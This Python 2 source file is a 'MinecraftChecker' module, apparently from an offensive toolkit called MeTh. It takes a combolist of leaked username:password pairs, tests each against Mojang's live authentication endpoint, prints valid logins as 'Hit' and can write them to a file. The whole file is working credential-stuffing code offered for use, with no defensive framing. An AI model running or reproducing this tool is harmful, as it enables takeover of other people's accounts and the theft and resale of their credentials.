#!/usr/bin/env python2
#! -*- coding: UTF-8 -*-
import os, sys, cfscrape
import json
import requests as reqs
from bs4 import BeautifulSoup
from MeTh.core.modules import *
from MeTh.utils import *

class Checker(Checker):
   __info__ = {
     "Name":"MinecraftChecker",
     "Version": "v0.1",
     "Authors": (
                   "Mr-Z3r0"
                ),
     "LastModified": "13-02-2020",
     "StartText":"Minecraft Checker it can ban you :)",
     "Description": "Minecraft Account Account checker"
   }
   combo = OptString("", "Insert your combolist")
   def run(self):
      if self.combo == "":
        print_error("You must set options after run")
      else:
        self.save = raw_input("Want you save hits y/n ")
        if self.save in ["y", "yes"]:
          self.file = raw_input("File > ")
        with open(self.combo) as f:
          for lines in f:
            users, passwords = lines.split(':')
            self.Threat(users.strip(), passwords.strip())
   def Threat(self, user, passw):
      session = cfscrape.create_scraper()
      login_page = "https://authserver.mojang.com/authenticate"
      #csrftok = login_soup.find(id='login_form__token')['value']
      params = {
        "agent": {
         "name": "Minecraft",
         "version": 1
        },
         "username": user,
         "password": passw
      }
      try: 
         source = reqs.post(login_page, json=params, timeout=15, headers={"Content-Type": "application/json"})
      except reqs.exceptions.Timeout as e:
          print_error(e)
          return
      
      json_data = json.loads(source.text)
      if source.status_code == 403:
         print("\033[1;31mFailed\033[0m: {}:{}".format(user, passw))
      if "availableProfiles" in json_data:
         print('\033[1;32mHit\033[0m {}:{}'.format(user, passw))
         Hit = user+':'+passw
         if self.save in ["y", "yes"]:
           try:
              f = open(self.file, "a+")
              f.write(Hit)
              f.close()
           except IOError:
             print_error("Unknown error")